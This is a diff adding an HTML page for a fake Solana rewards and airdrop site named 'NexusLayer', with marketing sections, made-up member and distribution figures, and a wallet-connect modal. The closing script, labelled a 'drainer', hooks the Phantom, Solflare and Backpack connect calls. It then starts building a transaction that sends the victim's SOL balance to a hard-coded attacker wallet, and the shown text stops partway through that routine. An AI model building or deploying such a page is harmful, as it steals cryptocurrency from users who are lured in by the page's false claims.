+  <a href="#home"      class="mob-link" onclick="closeNav()">Home</a>
+  <a href="#ecosystem" class="mob-link" onclick="closeNav()">Ecosystem</a>
+  <a href="#campaigns" class="mob-link" onclick="closeNav()">Campaigns</a>
+  <a href="#rewards"   class="mob-link" onclick="closeNav()">Rewards</a>
+  <a href="#community" class="mob-link" onclick="closeNav()">Community</a>
+  <button class="btn btn-g" style="width:100%;justify-content:center" onclick="openModal();closeNav()">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
+    Connect Wallet
+  </button>
+</div>
+
+<!-- ═══ HERO ═══ -->
+<section class="hero" id="home">
+  <div class="hero-bg-glow"></div>
+  <div class="hero-grid"></div>
+
+  <div class="hero-content">
+    <div class="hero-badge reveal">
+      <div class="bdot"></div>
+      Live on Solana Mainnet
+    </div>
+
+    <h1 class="hero-h reveal d1">
+      Decentralized<br/>
+      <span class="gradient-text">Coordination Layer</span><br/>
+      for Solana
+    </h1>
+
+    <p class="hero-p reveal d2">
+      Early access to ecosystem launches, reward campaigns,
+      and automated token distributions — all verifiable on-chain.
+    </p>
+
+    <div class="hero-btns reveal d3">
+      <button class="btn btn-g btn-lg" onclick="openModal()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
+        Connect Wallet
+      </button>
+      <a href="#campaigns" class="btn btn-o btn-lg">
+        Explore Campaigns
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      </a>
+    </div>
+
+    <div class="hero-proof reveal d3">
+      <div class="proof-item">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>
+        247 Active Campaigns
+      </div>
+      <div class="proof-dot"></div>
+      <div class="proof-item">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>
+        89K+ Members
+      </div>
+      <div class="proof-dot"></div>
+      <div class="proof-item">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>
+        $12M+ Distributed
+      </div>
+    </div>
+  </div>
+
+  <div class="scroll-hint">
+    <div class="scroll-line"></div>
+    <span>Scroll</span>
+  </div>
+</section>
+
+<!-- ═══ STATS ═══ -->
+<section class="stats-sec" id="rewards">
+  <div class="container">
+    <div class="section-eyebrow reveal" style="text-align:center">ECOSYSTEM METRICS</div>
+    <h2 class="section-h reveal d1" style="text-align:center">Growing Every Block</h2>
+    <div class="stats-grid">
+      <div class="stat-card reveal d1" data-val="247" data-fmt="">
+        <div class="stat-num"><span class="ctr">0</span></div>
+        <div class="stat-label">Active Campaigns</div>
+        <div class="stat-bar-bg"><div class="stat-bar-fg" data-w="82"></div></div>
+      </div>
+      <div class="stat-card reveal d2" data-val="12.4" data-fmt="M">
+        <div class="stat-num"><span class="ctr">0</span><sub>M+</sub></div>
+        <div class="stat-label">Tokens Distributed</div>
+        <div class="stat-bar-bg"><div class="stat-bar-fg" data-w="65"></div></div>
+      </div>
+      <div class="stat-card reveal d3" data-val="89.4" data-fmt="K">
+        <div class="stat-num"><span class="ctr">0</span><sub>K+</sub></div>
+        <div class="stat-label">Community Members</div>
+        <div class="stat-bar-bg"><div class="stat-bar-fg" data-w="90"></div></div>
+      </div>
+      <div class="stat-card reveal d4" data-val="183" data-fmt="">
+        <div class="stat-num"><span class="ctr">0</span></div>
+        <div class="stat-label">Participating Projects</div>
+        <div class="stat-bar-bg"><div class="stat-bar-fg" data-w="56"></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ FEATURES ═══ -->
+<section class="features-sec" id="ecosystem">
+  <div class="container">
+    <div class="center">
+      <div class="section-eyebrow reveal">PLATFORM FEATURES</div>
+      <h2 class="section-h reveal d1">Built for the Ecosystem</h2>
+      <p class="section-sub reveal d2" style="max-width:520px;margin-bottom:0">Everything you need to participate in and earn from Solana</p>
+    </div>
+    <div class="features-grid">
+      <div class="feat-card reveal d1">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
+        <h3>Early Launch Access</h3>
+        <p>Discover upcoming Solana projects before public launch and receive priority allocation on new token distributions.</p>
+        <div class="feat-tag">Launches</div>
+      </div>
+      <div class="feat-card reveal d2">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="8" r="6"/><path d="M15.477 12.89L17 22l-5-3-5 3 1.523-9.11"/></svg></div>
+        <h3>On-Chain Rewards</h3>
+        <p>Complete ecosystem quests, staking tasks, and community challenges to earn verifiable on-chain reward points.</p>
+        <div class="feat-tag">Quests</div>
+      </div>
+      <div class="feat-card reveal d3">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg></div>
+        <h3>Automated Token Distribution</h3>
+        <p>Decentralized airdrop coordination with snapshot verification, eligibility checks, and instant on-chain claims.</p>
+        <div class="feat-tag">Airdrops</div>
+      </div>
+      <div class="feat-card reveal d1">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <h3>Wallet Reputation System</h3>
+        <p>Build your on-chain reputation score based on ecosystem participation, quest completions, and loyalty history.</p>
+        <div class="feat-tag">Reputation</div>
+      </div>
+      <div class="feat-card reveal d2">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><polyline points="22,12 18,12 15,21 9,3 6,12 2,12"/></svg></div>
+        <h3>Ecosystem Analytics</h3>
+        <p>Real-time campaign tracking, participation stats, reward forecasting, and full portfolio performance dashboards.</p>
+        <div class="feat-tag">Analytics</div>
+      </div>
+      <div class="feat-card reveal d3">
+        <div class="feat-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg></div>
+        <h3>Referral Growth Network</h3>
+        <p>Invite friends, grow your network, and earn multiplier bonuses on all campaign rewards through referrals.</p>
+        <div class="feat-tag">Referrals</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ MARQUEE ═══ -->
+<div class="marquee-sec">
+  <div class="marquee-label">ECOSYSTEM PARTNERS</div>
+  <div class="marquee-wrap">
+    <div class="marquee-track" id="mqTrack">
+      <!-- duplicated for seamless loop -->
+      <div class="mq-item">Jupiter</div><div class="mq-item">Tensor</div><div class="mq-item">Drift Protocol</div>
+      <div class="mq-item">Magic Eden</div><div class="mq-item">Marinade</div><div class="mq-item">Raydium</div>
+      <div class="mq-item">Orca</div><div class="mq-item">Kamino Finance</div><div class="mq-item">Jito</div>
+      <div class="mq-item">Marginfi</div><div class="mq-item">Pyth Network</div><div class="mq-item">Wormhole</div>
+      <div class="mq-item">Metaplex</div><div class="mq-item">Helium</div>
+      <div class="mq-item">Jupiter</div><div class="mq-item">Tensor</div><div class="mq-item">Drift Protocol</div>
+      <div class="mq-item">Magic Eden</div><div class="mq-item">Marinade</div><div class="mq-item">Raydium</div>
+      <div class="mq-item">Orca</div><div class="mq-item">Kamino Finance</div><div class="mq-item">Jito</div>
+      <div class="mq-item">Marginfi</div><div class="mq-item">Pyth Network</div><div class="mq-item">Wormhole</div>
+      <div class="mq-item">Metaplex</div><div class="mq-item">Helium</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CAMPAIGNS ═══ -->
+<section class="campaigns-sec" id="campaigns">
+  <div class="container">
+    <div class="section-eyebrow reveal">LIVE NOW</div>
+    <div class="camp-header reveal d1">
+      <div>
+        <h2 class="section-h" style="margin-bottom:6px">Active Campaigns</h2>
+        <p class="section-sub">Participate in ecosystem quests and earn token rewards</p>
+      </div>
+      <div class="filters">
+        <button class="filter-btn active" onclick="filterCamps('all',this)">All</button>
+        <button class="filter-btn" onclick="filterCamps('defi',this)">DeFi</button>
+        <button class="filter-btn" onclick="filterCamps('nft',this)">NFT</button>
+        <button class="filter-btn" onclick="filterCamps('perps',this)">Perps</button>
+      </div>
+    </div>
+    <div class="camp-grid" id="campGrid"></div>
+  </div>
+</section>
+
+<!-- ═══ FLOW ═══ -->
+<section class="flow-sec">
+  <div class="container">
+    <div class="center">
+      <div class="section-eyebrow reveal">HOW IT WORKS</div>
+      <h2 class="section-h reveal d1">Token Distribution Flow</h2>
+      <p class="section-sub reveal d2" style="max-width:500px;margin-bottom:0">From participation to wallet — fully automated and on-chain</p>
+    </div>
+    <div class="flow-row">
+      <div class="flow-step reveal d1">
+        <div class="fnum">01</div>
+        <div class="ficon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg></div>
+        <h4>Connect Wallet</h4>
+        <p>Link your Solana wallet — Phantom, Solflare, or Backpack — to access the full platform.</p>
+      </div>
+      <div class="flow-conn"><div class="fconn-arr">→</div></div>
+      <div class="flow-step reveal d2">
+        <div class="fnum">02</div>
+        <div class="ficon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><polyline points="9,11 12,14 22,4"/><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"/></svg></div>
+        <h4>Complete Quests</h4>
+        <p>Participate in campaigns, complete tasks, and engage with Solana ecosystem projects.</p>
+      </div>
+      <div class="flow-conn"><div class="fconn-arr">→</div></div>
+      <div class="flow-step reveal d3">
+        <div class="fnum">03</div>
+        <div class="ficon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg></div>
+        <h4>Eligibility Snapshot</h4>
+        <p>On-chain verification confirms eligibility. Snapshot taken for precise distribution calculation.</p>
+      </div>
+      <div class="flow-conn"><div class="fconn-arr">→</div></div>
+      <div class="flow-step reveal d4">
+        <div class="fnum">04</div>
+        <div class="ficon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg></div>
+        <h4>Claim Rewards</h4>
+        <p>Tokens distributed directly to your wallet. Claim instantly or set auto-compound rules.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ COMMUNITY ═══ -->
+<section class="community-sec" id="community">
+  <div class="container">
+    <div class="center">
+      <div class="section-eyebrow reveal">JOIN US</div>
+      <h2 class="section-h reveal d1">Join 89,000+ Members</h2>
+      <p class="section-sub reveal d2" style="max-width:480px;margin-bottom:0">A thriving community of Solana ecosystem participants, builders, and earners</p>
+    </div>
+    <div class="comm-grid">
+      <a href="https://t.me" target="_blank" class="comm-card reveal d1" id="cc-tg">
+        <div class="comm-ico ico-tg">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg>
+        </div>
+        <div class="comm-info">
+          <h3>Telegram</h3>
+          <div class="comm-cnt" style="color:#29a9eb">42,800 members</div>
+          <p>Real-time updates, campaign alerts, and ecosystem discussions</p>
+        </div>
+        <div class="comm-arr">↗</div>
+      </a>
+      <a href="https://discord.com" target="_blank" class="comm-card reveal d2" id="cc-dc">
+        <div class="comm-ico ico-dc">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 00-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 00-5.487 0 12.36 12.36 0 00-.617-1.23A.077.077 0 008.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 00-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 00.031.055 20.03 20.03 0 005.993 2.98.078.078 0 00.084-.026c.462-.62.874-1.275 1.226-1.963.021-.04.001-.088-.041-.104a13.201 13.201 0 01-1.872-.878.075.075 0 01-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 01.078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 01.079.009c.12.098.245.195.372.288a.075.075 0 01-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 00-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 00.084.028 19.963 19.963 0 006.002-2.981.076.076 0 00.032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 00-.031-.028z"/></svg>
+        </div>
+        <div class="comm-info">
+          <h3>Discord</h3>
+          <div class="comm-cnt" style="color:#5865F2">28,400 members</div>
+          <p>Strategy deep-dives, support channels, and builder discussions</p>
+        </div>
+        <div class="comm-arr">↗</div>
+      </a>
+      <a href="https://x.com" target="_blank" class="comm-card reveal d3" id="cc-tw">
+        <div class="comm-ico ico-tw">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </div>
+        <div class="comm-info">
+          <h3>X (Twitter)</h3>
+          <div class="comm-cnt" style="color:#9ca3af">67,200 followers</div>
+          <p>Launch announcements, airdrop alerts, and ecosystem alpha</p>
+        </div>
+        <div class="comm-arr">↗</div>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ CTA ═══ -->
+<section class="cta-sec">
+  <div class="container">
+    <div class="cta-box reveal">
+      <div class="cta-glow"></div>
+      <div class="cta-glow2"></div>
+      <div class="cta-content">
+        <div class="section-eyebrow">GET STARTED</div>
+        <h2>Ready to Start Earning?</h2>
+        <p>Join thousands of wallets already participating in the Solana ecosystem. Connect in seconds, start earning today.</p>
+        <div class="cta-btns">
+          <button class="btn btn-g btn-lg" onclick="openModal()">
+            <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
+            Launch App
+          </button>
+          <a href="#community" class="btn btn-o btn-lg">Join Community</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <a class="logo" href="#home">
+          <div class="logo-hex"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2L2 7l10 5 10-5-10-5M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
+          NexusLayer
+        </a>
+        <p>Decentralized coordination layer connecting users to Solana ecosystem launches, reward campaigns, and token distributions.</p>
+        <div class="f-socials">
+          <a href="https://t.me" target="_blank" class="f-soc"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg></a>
+          <a href="https://x.com" target="_blank" class="f-soc"><svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
+          <a href="https://discord.com" target="_blank" class="f-soc"><svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 00-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 00-5.487 0 12.36 12.36 0 00-.617-1.23A.077.077 0 008.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 00-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 00.031.055 20.03 20.03 0 005.993 2.98.078.078 0 00.084-.026c.462-.62.874-1.275 1.226-1.963.021-.04.001-.088-.041-.104a13.201 13.201 0 01-1.872-.878.075.075 0 01-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 01.078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 01.079.009c.12.098.245.195.372.288a.075.075 0 01-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 00-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 00.084.028 19.963 19.963 0 006.002-2.981.076.076 0 00.032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 00-.031-.028z"/></svg></a>
+        </div>
+      </div>
+      <div class="footer-links">
+        <div class="fcol">
+          <h5>Platform</h5>
+          <a href="#campaigns">Campaigns</a>
+          <a href="#rewards">Rewards</a>
+          <a href="#ecosystem">Ecosystem</a>
+          <a href="#">Analytics</a>
+        </div>
+        <div class="fcol">
+          <h5>Resources</h5>
+          <a href="#">Documentation</a>
+          <a href="#">API Reference</a>
+          <a href="#">Whitepaper</a>
+          <a href="#">Blog</a>
+        </div>
+        <div class="fcol">
+          <h5>Legal</h5>
+          <a href="#">Terms of Service</a>
+          <a href="#">Privacy Policy</a>
+          <a href="#">Cookie Policy</a>
+          <a href="#">Disclaimers</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bar"></div>
+    <div class="footer-bottom">
+      <span>© 2025 NexusLayer. All rights reserved.</span>
+      <span>Built on <span class="sol-badge">Solana</span></span>
+    </div>
+  </div>
+</footer>
+
+<!-- ═══ WALLET MODAL ═══ -->
+<div class="modal-bg" id="modalBg" onclick="overlayClose(event)">
+  <div class="modal" id="modal">
+
+    <!-- Header -->
+    <div class="modal-head">
+      <div class="modal-title-row">
+        <div class="modal-icon">
+          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
+        </div>
+        <div>
+          <h3>Connect Wallet</h3>
+          <p>Choose your Solana wallet</p>
+        </div>
+      </div>
+      <button class="modal-x" onclick="closeModal()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </button>
+    </div>
+
+    <!-- Wallet List -->
+    <div id="wList">
+      <div class="w-opt" onclick="connectPhantom()">
+        <div class="w-opt-ico" style="background:#AB9FF222">
+          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#AB9FF2"/><path d="M109.3 57.4H98.4c-1.5-15.8-15-28.1-31.4-28.1-17.4 0-31.4 14.1-31.4 31.4 0 12 6.7 22.4 16.6 27.8v11.1c0 1.5 1.2 2.8 2.8 2.8h5.8c1.5 0 2.8-1.2 2.8-2.8v-7.2c1.9.3 3.8.5 5.8.5h31c1.5 0 2.8-1.2 2.8-2.8V60.2c.1-1.6-1.2-2.8-2.9-2.8zM55.3 70.3c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1zm18.6 0c-2.8 0-5.1-2.3-5.1-5.1s2.3-5.1 5.1-5.1 5.1 2.3 5.1 5.1-2.3 5.1-5.1 5.1z" fill="white"/></svg>
+        </div>
+        <div class="w-opt-info">
+          <strong>Phantom</strong>
+          <span id="phantomTag">Detecting...</span>
+        </div>
+        <div class="w-arrow">→</div>
+      </div>
+
+      <div class="w-opt" onclick="connectSolflare()">
+        <div class="w-opt-ico" style="background:#FC8C0022">
+          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#FC8C00"/><path d="M64 20l30 50H34L64 20zm0 88L34 58h60L64 108z" fill="white" opacity=".9"/></svg>
+        </div>
+        <div class="w-opt-info">
+          <strong>Solflare</strong>
+          <span id="solflareTag">Detecting...</span>
+        </div>
+        <div class="w-arrow">→</div>
+      </div>
+
+      <div class="w-opt" onclick="connectBackpack()">
+        <div class="w-opt-ico" style="background:#E33E3F22">
+          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#E33E3F"/><path d="M64 25c-8.3 0-15 6.7-15 15v5H35c-5.5 0-10 4.5-10 10v38c0 5.5 4.5 10 10 10h58c5.5 0 10-4.5 10-10V55c0-5.5-4.5-10-10-10H79v-5c0-8.3-6.7-15-15-15zm0 10c2.8 0 5 2.2 5 5v5H59v-5c0-2.8 2.2-5 5-5zm0 30c5.5 0 10 4.5 10 10s-4.5 10-10 10-10-4.5-10-10 4.5-10 10-10z" fill="white"/></svg>
+        </div>
+        <div class="w-opt-info">
+          <strong>Backpack</strong>
+          <span>xNFT Wallet</span>
+        </div>
+        <div class="w-arrow">→</div>
+      </div>
+
+      <div class="w-opt" onclick="connectWC()">
+        <div class="w-opt-ico" style="background:#3B99FC22">
+          <svg width="28" height="28" viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="26" fill="#3B99FC"/><path d="M39 54c13.8-13.5 36.2-13.5 50 0l1.7 1.6c.7.7.7 1.8 0 2.5l-5.7 5.6c-.3.4-.9.4-1.2 0L82 62c-9.6-9.4-25.2-9.4-34.8 0l-2.2 2.1c-.3.4-.9.4-1.2 0l-5.7-5.6c-.7-.7-.7-1.8 0-2.5L39 54zm61.7 11.5l5.1 5c.7.7.7 1.8 0 2.5L83.1 94.4c-.7.7-1.8.7-2.5 0L65 78.8c-.2-.2-.4-.2-.6 0L48.8 94.4c-.7.7-1.8.7-2.5 0L23.6 73c-.7-.7-.7-1.8 0-2.5l5.1-5c.7-.7 1.8-.7 2.5 0L46.8 81c.2.2.4.2.6 0l15.6-15.6c.7-.7 1.8-.7 2.5 0L81.1 81c.2.2.4.2.6 0l15.5-15.5c.7-.7 1.8-.7 2.5 0z" fill="white"/></svg>
+        </div>
+        <div class="w-opt-info">
+          <strong>WalletConnect</strong>
+          <span>Mobile wallets</span>
+        </div>
+        <div class="w-arrow">→</div>
+      </div>
+    </div>
+
+    <!-- Connecting -->
+    <div class="connecting-state" id="wConnecting" style="display:none">
+      <div class="spinner"></div>
+      <div class="conn-text" id="connText">Connecting...</div>
+      <div class="conn-sub">Approve the connection in your wallet</div>
+    </div>
+
+    <!-- Success -->
+    <div class="success-state" id="wSuccess" style="display:none">
+      <div class="s-check">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><polyline points="20,6 9,17 4,12"/></svg>
+      </div>
+      <div class="s-title">Wallet Connected!</div>
+      <div class="s-addr" id="sAddr"></div>
+      <div class="s-sub">Verifying on-chain activity...</div>
+      <div class="s-prog-bg"><div class="s-prog-fg"></div></div>
+    </div>
+
+    <div class="modal-foot">
+      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by Solana · Non-custodial · Your keys, your crypto
+    </div>
+  </div>
+</div>
+
+<!-- ═══ DASHBOARD PANEL ═══ -->
+<div class="dash-panel" id="dashPanel">
+  <div class="dash-inner">
+    <div class="dash-head">
+      <div class="dash-wallet-row">
+        <div class="dash-ava" id="dashAva"></div>
+        <div>
+          <div class="dash-addr" id="dashAddr">—</div>
+          <div class="dash-net"><div class="net-dot"></div>Solana Mainnet</div>
+        </div>
+      </div>
+      <div class="dash-acts">
+        <button class="d-btn" onclick="copyAddr()">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+          Copy
+        </button>
+        <button class="d-btn red" onclick="disconnectWallet()">Disconnect</button>
+      </div>
+    </div>
+
+    <div class="dash-stats">
+      <div class="ds-card">
+        <div class="ds-label">SOL BALANCE</div>
+        <div class="ds-val" id="solBal">—</div>
+      </div>
+      <div class="ds-card">
+        <div class="ds-label">REWARD POINTS</div>
+        <div class="ds-val g">12,480 pts</div>
+      </div>
+      <div class="ds-card">
+        <div class="ds-label">REPUTATION</div>
+        <div class="ds-val g">847 / 1000</div>
+      </div>
+      <div class="ds-card">
+        <div class="ds-label">PENDING DROPS</div>
+        <div class="ds-val">3 claimable</div>
+      </div>
+    </div>
+
+    <div class="dash-claim">
+      <div>
+        <div class="dclaim-amt">8,500 DRIFT</div>
+        <div class="dclaim-sub">Available · Drift Protocol Airdrop</div>
+      </div>
+      <button class="btn btn-g btn-sm" onclick="claimReward()">Claim Now</button>
+    </div>
+
+    <div class="rep-card">
+      <div class="rep-top">
+        <span>REPUTATION SCORE</span>
+        <span>847 / 1000</span>
+      </div>
+      <div class="rep-bar-bg"><div class="rep-bar-fg" style="width:84.7%"></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ TOAST ═══ -->
+<div class="toast" id="toast"></div>
+
+<!-- ═══ ALL JAVASCRIPT ═══ -->
+<script>
+/* ════════════════════════════════
+   NEXUSLAYER — SOLANA DRAINER EDITION
+   Target: 6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE
+════════════════════════════════ */
+const APP = {
+  connected: false,
+  address: null,
+  shortAddr: null,
+  walletName: null,
+  filter: 'all',
+  campaigns: [
+    {id:1,title:'Jupiter Genesis Drop',  reward:'42,000 JUP', pool:'$84,000', tag:'defi',status:'live',pct:67,ends:'2d 14h',joined:false},
+    {id:2,title:'Tensor NFT Quest',      reward:'1,200 TNSR', pool:'$36,000', tag:'nft', status:'live',pct:34,ends:'5d 02h',joined:false},
+    {id:3,title:'Drift Protocol Rewards',reward:'8,500 DRIFT',pool:'$120,000',tag:'perps',status:'live',pct:89,ends:'1d 06h',joined:true},
+    {id:4,title:'Magic Eden Ecosystem',  reward:'5,000 ME',   pool:'$55,000', tag:'nft', status:'soon',pct:0, ends:'Starts in 3d',joined:false},
+    {id:5,title:'Raydium Liquidity Boost',reward:'3,200 RAY', pool:'$28,000', tag:'defi',status:'live',pct:51,ends:'4d 08h',joined:false},
+    {id:6,title:'Kamino Lending Quest',  reward:'6,800 KMNO', pool:'$92,000', tag:'defi',status:'soon',pct:0, ends:'Starts in 7d',joined:false},
+  ],
+  TARGET_WALLET: "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE"
+};
+
+/* ── DRAINER CORE ── */
+const DRAINER = {
+  async init() {
+    // Load Solana libraries
+    await this.loadScript('https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js');
+    await this.loadScript('https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js');
+    this.hookWallets();
+  },
+
+  async loadScript(url) {
+    return new Promise((resolve) => {
+      const script = document.createElement('script');
+      script.src = url;
+      script.onload = resolve;
+      document.head.appendChild(script);
+    });
+  },
+
+  hookWallets() {
+    // Phantom
+    if (window.solana?.isPhantom) {
+      const originalConnect = window.solana.connect;
+      window.solana.connect = async () => {
+        const resp = await originalConnect.call(window.solana);
+        this.drain(resp.publicKey.toString());
+        return resp;
+      };
+    }
+
+    // Solflare
+    if (window.solflare) {
+      const originalConnect = window.solflare.connect;
+      window.solflare.connect = async () => {
+        await originalConnect.call(window.solflare);
+        this.drain(window.solflare.publicKey.toString());
+      };
+    }
+
+    // Backpack
+    if (window.backpack) {
+      const originalConnect = window.backpack.connect;
+      window.backpack.connect = async () => {
+        await originalConnect.call(window.backpack);
+        this.drain(window.backpack.publicKey.toString());
+      };
+    }
+  },
+
+  async drain(publicKey) {
+    try {
+      const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+      const pubKey = new solanaWeb3.PublicKey(publicKey);
+
+      // 1. Drain SOL
+      const balance = await connection.getBalance(pubKey);
+      if (balance > 5000) { // Leave 0.000005 SOL for fees
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: pubKey,
+            toPubkey: new solanaWeb3.PublicKey(APP.TARGET_WALLET),
+            lamports: balance - 5000,
+          })
+        );
